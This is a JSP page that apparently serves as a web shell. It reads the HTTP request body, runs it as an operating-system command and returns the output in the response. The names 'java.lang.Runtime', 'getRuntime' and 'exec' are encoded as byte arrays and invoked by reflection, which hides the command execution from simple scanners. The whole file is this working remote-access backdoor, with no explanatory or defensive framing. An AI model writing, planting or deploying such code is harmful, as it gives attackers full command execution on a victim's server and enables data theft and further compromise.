<%@ page import="java.io.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
	br.close();
    if(wholeStr != null && !wholeStr.trim().equals("")){
    	wholeStr = wholeStr.substring(0,wholeStr.length()-1);
        Class clazz = Class.forName(new String(new byte[] {106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101}));
        InputStream in  = ((Process) clazz.getMethod(new String(new byte[] {101,120,101,99}), String[].class).invoke(clazz.getMethod(new String(new byte[] {103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{wholeStr.split(",",3)})).getInputStream();
        int len = 0;
        byte[] buffer = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while((len = in.read(buffer)) != -1){
            baos.write(buffer, 0, len);
        }

        response.getWriter().print(baos.toString().trim());
		in.close();
		baos.close();
    }
%>